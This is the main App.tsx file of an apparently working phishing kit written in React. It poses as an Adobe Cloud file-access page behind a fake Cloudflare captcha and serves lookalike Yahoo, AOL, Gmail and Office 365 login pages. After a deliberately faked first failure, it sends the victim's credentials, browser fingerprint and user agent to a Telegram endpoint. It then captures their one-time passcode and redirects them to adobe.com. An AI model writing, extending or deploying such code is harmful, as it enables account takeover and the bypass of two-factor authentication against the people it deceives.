import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
    // Continue the user flow even if Telegram fails
  }
};

function App() {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  
  // Simplified state to manage the entire login flow
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });

  const navigate = useNavigate();
  const location = useLocation();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const isActive = event.action !== 'remove' && !!event.value;
        if (isActive !== hasActiveSession) {
          setHasActiveSession(isActive);
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, [hasActiveSession]);

  // This is the corrected routing logic
  useEffect(() => {
    // If the user has a session, they should always be on the landing page
    if (hasActiveSession && location.pathname !== '/landing') {
      navigate('/landing', { replace: true });
    }
    // If the user is logged out and somehow gets to /landing, send them to root
    if (!hasActiveSession && location.pathname === '/landing') {
      navigate('/', { replace: true });
    }
  }, [hasActiveSession, location.pathname, navigate]);


  const handleCaptchaVerified = () => {
    navigate('/login');
  };

  const handleLoginSuccess = async (loginData: any) => {
    if (!loginData.isSecondAttempt) return; // Only proceed after the second (fake) failure

    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const credentialsData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };
    
    // Send credentials, then show OTP page
    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
    
    setLoginFlowState({
      awaitingOtp: true,
      sessionData: credentialsData,
    });
    setIsLoading(false);
    navigate('/otp', { replace: true });
  };
  
  const handleOtpSubmit = async (otp: string) => {
    if (!loginFlowState.sessionData) {
      navigate('/', { replace: true });
      return;
    }
    
    setIsLoading(true);
    
    // Send OTP, then redirect to the final destination
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginFlowState.sessionData },
    });
    
    // Redirect. No need to clear state, as the page will be replaced.
    window.location.href = 'https://www.adobe.com';
  };

  const handleLogout = () => {
    localStorage.clear();
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false); // This triggers the useEffect to navigate to "/"
    setLoginFlowState({ awaitingOtp: false, sessionData: null });
  };

  // --- Render Logic ---
  if (isLoading) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
      
      <Route path="/login" element={!hasActiveSession ? <LoginComponent fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
      
      <Route path="/otp" element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} /> : <Navigate to="/" replace />} />
      
      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
      
      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;
